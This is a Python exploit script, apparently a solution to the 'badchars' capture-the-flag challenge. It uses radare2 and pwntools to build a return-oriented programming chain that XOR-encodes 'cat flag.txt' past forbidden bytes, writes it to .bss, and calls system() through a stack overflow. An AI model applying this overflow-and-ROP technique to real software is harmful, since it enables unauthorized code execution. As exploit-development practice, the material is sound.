import r2pipe
from pwn import *
import gadgets

binary = './badchars'
padding = 40

def hex2int(s):
    return int(s[2:], 16)

r2 = r2pipe.open(binary)
r2.cmd('aaaa')

sections = r2.cmdj('iSj')
bss_addr = None
for sec in sections:
    if sec['name'] == '.bss':
        bss_addr = sec['vaddr']

print(bss_addr)

system_addr = hex2int(r2.cmd('is~system').strip().split()[2])
fgets_addr = hex2int(r2.cmd('is~fgets').strip().split()[2])

# put content here (define payload)

badchars = b'bic/ fns'

need_to_write = b'cat flag.txt\x00'
xor_key_b = 0x44

new_str = []
idx = []
for i, ch in enumerate(need_to_write):
    if ch in badchars:
        new_str.append(ch ^ 0x44)
        idx.append(i)
    else:
        new_str.append(ch)
print(new_str)

ns = []
while new_str:
    batch, new_str = new_str[:8], new_str[8:]
    ns.append(u64(bytes(batch).ljust(8, b'\x00')))
print([hex(n) for n in ns])


xor_ptr_r15_r14b = 0x00400b30
def xor(addr):
    b = b''
    b += gadgets.pop_r15(addr)
    b += p64(xor_ptr_r15_r14b)
    return b

payload = b''

for i, n in enumerate(ns):
    payload += gadgets.pop_r12_r13(ns[i], bss_addr + i * 8)
    payload += gadgets.mov_ptr_r13_r12()


payload += gadgets.pop_r14_r15(xor_key_b, bss_addr)
for i in idx:
    payload += xor(bss_addr + i)

print(hex(gadgets.pop_rdi_addr))
payload += gadgets.pop_rdi(bss_addr)
payload += p64(system_addr)


for ch in badchars:
    if ch in payload:
        print('oh no')
        print(ch, repr(payload))
        exit(0)

with open('payload.bin', 'wb') as f:
    f.write(b'a' * padding + payload)

log.hexdump(payload)
# end of content
p = process(binary)
p.sendline(b'x' * padding + payload)
p.interactive()
p.wait()
print(p.recvall().decode())
